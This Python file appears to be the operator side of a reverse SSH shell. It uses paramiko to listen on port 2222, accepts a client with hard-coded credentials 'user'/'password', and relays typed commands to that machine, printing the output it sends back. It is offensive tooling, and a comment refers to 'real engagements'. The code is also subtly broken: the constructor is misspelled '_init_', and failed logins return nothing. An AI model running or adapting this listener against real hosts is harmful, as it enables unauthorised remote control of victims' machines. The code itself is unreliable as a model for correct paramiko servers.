import os
import paramiko
import socket
import sys
import threading

hostkey_file = input('HOSTKEY file name: ')
CWD     = os.path.dirname(os.path.realpath(__file__))
# RSA key can be used to sign and verify SSH data during SSH2 negoatiation
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, hostkey_file))

class Sass_Server (paramiko.ServerInterface):
    ''' Performs authentication and creates channels'''
    def _init_(self):
        # An event to trigger when session negotiation is complete
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        # Allows or denied the request to open a channel
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        # Client needs to authenticate
        # For real engagements, not recommended to hard-code credentials
        if (username == 'user') and (password == 'password'):
            return paramiko.AUTH_SUCCESSFUL
    
if __name__ == '__main__':
        server   = input("Enter SSH server IP: ")
        ssh_port = 2222
        print("Default port is: " + str(ssh_port))
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind ((server, ssh_port))
            sock.listen(100)
            print("[+] Listening for connection...")
            client, addr = sock.accept()
        except Exception as e:
            print('[-] Listen failed: ' + str(e))
            sys.exit(1)
        else:
            print('[+] Got a connection from: ', addr[0], addr[1])

        # An SSH Transport attaches to a stream (socket), negotiates an encrypted session,
        # authenticates and creates stream tunnels (channels)
        Session = paramiko.Transport(client)
        # Add the HOSTKEY to the list of keys used for server mode
        Session.add_server_key(HOSTKEY)
        server = Sass_Server()
        # Negotiate a new SSH2 session as a server 
        Session.start_server(server=server)

        # Return the next channel opened by client's request
        channel = Session.accept(20)
        if channel is None:
            print('Client request to open a channel failed.')
            sys.exit(1)
        
        print('[+] Yaaaas, you are authenticated!')
        # Client sends: 'ClientConnected' message
        print(channel.recv(1024))
        channel.send('WELCOME TO SASS_SSH: ')
        try:
            while True:
                command = input("Enter command: ")
                if command != 'exit':
                    channel.send(command)
                    r = channel.recv(8192)
                    print(r.decode())
                else:
                    channel.send('exit')
                    print('You exiting, hoe')
                    Session.close()
                    break
        except KeyboardInterrupt:
            Session.close()

